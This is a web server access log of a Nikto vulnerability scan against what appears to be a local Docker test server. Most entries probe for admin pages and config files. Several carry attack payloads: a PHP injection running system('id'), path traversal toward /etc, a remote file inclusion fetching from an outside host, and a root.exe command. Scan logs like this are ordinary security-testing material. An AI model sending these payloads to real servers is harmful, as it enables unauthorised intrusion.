172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php3 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.html HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.htm HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.shtml HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.cfm HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.cgi HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.pl HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.asp HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.aspx HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /default.asp HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /default.aspx HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /default.htm HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.do HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.jhtml HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:multiple_index)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "PUT /nikto-test-o6PTknwc.html HTTP/1.1" 405 587 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:put_del_test: PUT)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "OPTIONS * HTTP/1.1" 200 162 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: OPTIONS *)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "OPTIONS / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: OPTIONS /)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "DEBUG / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: DEBUG)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "PROPFIND / HTTP/1.1" 400 0 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: PROPFIND)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "TRACE / HTTP/1.0" 405 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: TRACE)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "TRACE / HTTP/1.0" 405 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: TRACE)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "TRACK / HTTP/1.0" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: TRACK)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "TRACK / HTTP/1.0" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:httpoptions: TRACK)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /TiVoConnect?Command=QueryServer HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000001)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /TiVoConnect?Command=QueryContainer&Container=/&Recurse=Yes HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000002)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfappman/index.cfm HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000013)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfdocs/examples/cvbeans/beaninfo.cfm HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000014)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfdocs/examples/parks/detail.cfm HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000015)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /kboard/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000016)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /lists/admin/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000017)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /splashAdmin.php HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000018)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ssdefs/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000019)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /sshome/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000020)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /tiki/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000021)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /tiki/tiki-install.php HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000022)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/samples/details.idc HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000023)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /_vti_bin/shtml.exe HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000024)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /./ HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000037)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /~root/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000038)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-bin/wrap HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000039)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /forums//admin/config.php HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000040)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /forums//adm/config.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000040)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /forums//administrator/config.php HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000040)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /forums/config.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000041)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ganglia/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000042)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /guestbook/guestbookdat HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000043)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /guestbook/pwd HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000044)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /help/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000045)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hola/admin/cms/htmltags.php?datei=./sec/data.php HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000046)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /horde/imp/test.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000047)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /horde/test.php?mode=phpinfo HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000048)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /imp/horde/test.php?mode=phpinfo HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000049)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /imp/horde/test.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000050)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.html.bak HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000051)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.html~ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000052)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000053)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /global.inc HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000054)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /inc/common.load.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000057)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /inc/config.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000058)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /inc/dbase.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000059)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /forumdisplay.php?GLOBALS[]=1&f=2&comma=\\\".system('id').\\\" HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000070)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /guestbook/guestbook.html HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000071)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /html/cgi-bin/cgicso?query=AAA HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000072)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /geeklog/users.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000073)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /gb/index.php?login=true HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000074)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /guestbook/admin.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000075)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /getaccess HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000078)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /help.html HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000079)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /filemanager/filemanager_forms.php?lib_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000081)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfdocs/expeval/openfile.cfm HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000092)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php/123 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000093)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /mambo/index.php?Itemid=lySl9 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000094)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /profile.php?u=VTgsPpvj HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000095)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ticket.php?id=99999 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000096)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/login/1,501,,00.html?cookieName=x--\\> HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000097)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /a%5c.aspx HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000098)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /admin/browse.asp?FilePath=c:\\&Opt=2&level=0 HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000102)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /tsweb/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000106)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/performance/TMT HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000109)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/performance/TMT/Report HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000110)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/performance/TMT/Report/XML HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000111)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/performance/TMT/reset HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000112)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/ppstats HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000113)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/previewer HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000114)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/record/previewer HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000115)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/stylepreviewer HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000116)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/vr/Deleting HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000117)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/vr/Editing HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000118)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/vr/Saving HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000119)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/vr/Select HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000120)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/iisadmin/bdir.htr HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000121)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/iisadmin/ism.dll HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000122)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/tools/ctss.idc HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000123)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /bigconf.cgi HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000124)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /billing/billing.apw HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000125)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /blah_badfile.shtml HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000126)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /blah-whatever-badfile.jsp HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000127)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/style HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000128)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/no-such-file.pl HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000129)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/commerce/foundation/domain.asp HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000130)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/commerce/foundation/driver.asp HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000131)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/commerce/foundation/DSN.asp HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000132)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/admin/findvserver.asp HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000133)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/knowledge/dsmgr/default.asp HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000134)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /basilix/mbox-list.php3 HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000138)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /basilix/message-read.php3 HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000139)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /clusterframe.jsp HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000140)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /IlohaMail/blank.html HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000141)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /bb-dnbd/faxsurvey HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000142)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cartcart.cgi HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000143)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/Carello/Carello.dll HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000144)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/tools/dsnform.exe HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000145)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/tools/dsnform HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000146)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000147)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000148)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /prd.i/pgen/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000149)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /readme.eml HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000150)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/httpodbc.dll HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000151)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/proxy/w3proxy.dll HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000152)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/root.exe?/c+dir+c:\\+/OG HTTP/1.1" 404 471 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000153)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/admin/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000154)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /siteseed/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000155)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/samples/search/author.idq HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000156)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/samples/search/filesize.idq HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000157)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/samples/search/filetime.idq HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000158)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/samples/search/queryhit.idq HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000159)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/samples/search/simple.idq HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000160)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /pccsmysqladm/incs/dbconnect.inc HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000161)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /iisadmin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000162)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /password.inc HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000163)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /PDG_Cart/oder.log HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000164)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /web-console/ServerInfo.jsp%00 HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000165)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /global.asa HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000166)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/AMPROPS.INC HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000167)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/DELETE.INC HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000168)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/GETREND.INC HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000169)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/GETWHEN.INC HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000170)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/JSATTACH.INC HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000171)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/JSROOT.INC HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000172)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/JSUTIL.INC HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000173)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/LANG.INC HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000174)"
